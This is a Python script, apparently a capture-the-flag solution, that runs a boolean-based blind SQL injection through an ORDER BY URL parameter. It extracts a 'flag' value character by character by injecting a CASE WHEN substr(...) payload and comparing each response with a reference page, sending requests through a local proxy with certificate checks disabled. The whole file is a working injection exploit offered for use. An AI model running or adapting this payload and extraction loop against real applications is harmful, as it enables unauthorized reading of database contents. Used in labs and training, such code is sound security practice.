import sys
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}




def res_verify(res): 
    if res == refer_res:
        return True
    else:
        return False


def sqli_flag(url):
    flag = ""
    for i in range(1,39):
        for j in range(30,176):
            char = chr(j)
            sqli_payload = "(Case WHEN substr((SELECT flag FROM flag limit 1),%s,1) = '%s' THEN title ELSE date end)" %(i,char)
            r = requests.get(url+sqli_payload, proxies=proxies, verify=False)
            verify = res_verify(r.text)
            if verify:
                flag += char
                sys.stdout.write('\r' + flag)
                sys.stdout.flush()
                break
            else:
                sys.stdout.write('\r' + flag + char)
                sys.stdout.flush()


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("[+] Usage: %s url" %sys.argv[0])
        print("[+] Example: %s http://10.101.214.11/?order=" %sys.argv[0])
        sys.exit(-1)
    url = sys.argv[1]
    refer_res = requests.get(url+"title", proxies=proxies, verify=False).text #Refrence response (sort by 'title') for verification of True condition in payload
    print("Extracting the flag....")
    sqli_flag(url)
